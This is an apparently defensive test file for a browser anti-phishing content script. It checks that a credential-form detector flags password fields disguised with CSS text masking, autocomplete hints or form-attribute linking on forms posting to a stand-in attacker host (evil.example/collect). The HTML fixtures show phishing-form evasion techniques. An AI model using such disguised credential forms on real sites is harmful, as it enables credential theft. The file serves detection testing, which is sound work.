import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { JSDOM } from "jsdom";

const contentSource = fs.readFileSync(
  new URL("../content.js", import.meta.url),
  "utf8"
);

function extractFunction(source, name) {
  const start = source.indexOf(`function ${name}(`);
  if (start < 0) throw new Error(`missing function ${name}`);
  let depth = 0;
  for (let i = source.indexOf("{", start); i < source.length; i++) {
    const ch = source[i];
    if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        const body = source.slice(start, i + 1);
        return new Function(`${body}\nreturn ${name};`)();
      }
    }
  }
  throw new Error(`unterminated function ${name}`);
}

const formHasCredentialSecret = extractFunction(
  contentSource,
  "formHasCredentialSecret"
);

function documentFor(html) {
  return new JSDOM(html, { url: "https://phish.example/login" }).window
    .document;
}

function blockingWouldFire(document) {
  const forms = document.querySelectorAll("form");
  for (const form of forms) {
    if (!formHasCredentialSecret(form)) continue;
    const action = form.action || "";
    if (!action.includes("login.microsoftonline.com")) return true;
  }
  return false;
}

test("masked passwd field on an attacker form is a credential secret", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="hidden" name="loginfmt" value="user@contoso.com">
      <input type="text" name="passwd" id="i0118" autocomplete="current-password"
        style="-webkit-text-security: disc">
      <button type="submit" id="idSIButton9">Sign in</button>
    </form>
  `);
  const form = document.getElementById("login");

  assert.equal(form.querySelector('input[type="password"]'), null);
  assert.equal(formHasCredentialSecret(form), true);
  assert.equal(form.action, "https://evil.example/collect");
  assert.equal(blockingWouldFire(document), true);
});

test("password-named text field without a mask is still submitted", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="text" name="passwd">
    </form>
  `);
  assert.equal(formHasCredentialSecret(document.getElementById("login")), true);
  assert.equal(blockingWouldFire(document), true);
});

test("autocomplete current-password marks an otherwise generic text field", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="text" name="secret" autocomplete="current-password">
    </form>
  `);
  assert.equal(formHasCredentialSecret(document.getElementById("login")), true);
});

test("a text secret linked with the form attribute belongs to that form", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post"></form>
    <input type="text" name="passwd" form="login" style="-webkit-text-security: disc">
  `);
  const form = document.getElementById("login");
  assert.equal(form.querySelector("input"), null);
  assert.equal(formHasCredentialSecret(form), true);
  assert.equal(blockingWouldFire(document), true);
});

test("nested type=password fields are still detected", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="password" name="passwd">
    </form>
  `);
  assert.equal(formHasCredentialSecret(document.getElementById("login")), true);
  assert.equal(blockingWouldFire(document), true);
});

test("a disguised secret that posts to Microsoft is not blocked", () => {
  const document = documentFor(`
    <form id="login" action="https://login.microsoftonline.com/common/login" method="post">
      <input type="text" name="passwd" style="-webkit-text-security: disc">
    </form>
  `);
  assert.equal(formHasCredentialSecret(document.getElementById("login")), true);
  assert.equal(blockingWouldFire(document), false);
});

test("email-only and ordinary text fields are not credential secrets", () => {
  const document = documentFor(`
    <form id="login" action="https://evil.example/collect" method="post">
      <input type="email" name="loginfmt">
      <input type="text" name="displayName" id="passenger">
      <input type="hidden" name="passwd" value="not-typed">
    </form>
  `);
  assert.equal(formHasCredentialSecret(document.getElementById("login")), false);
  assert.equal(blockingWouldFire(document), false);
});

test("credential blocking calls formHasCredentialSecret", () => {
  const first = contentSource.indexOf('case "form_action_validation":');
  const second = contentSource.indexOf(
    'case "form_action_validation":',
    first + 1
  );
  assert.notEqual(first, -1);
  assert.notEqual(second, -1);

  for (const start of [first, second]) {
    const slice = contentSource.slice(start, start + 800);
    assert.match(slice, /formHasCredentialSecret\(form\)/);
    assert.equal(
      slice.includes('form.querySelector(\'input[type="password"]\')'),
      false
    );
  }

  const cssCase = contentSource.indexOf('case "css_spoofing_validation":');
  assert.notEqual(cssCase, -1);
  const cssSlice = contentSource.slice(cssCase, cssCase + 2200);
  assert.match(cssSlice, /formHasCredentialSecret\(form\)/);
});
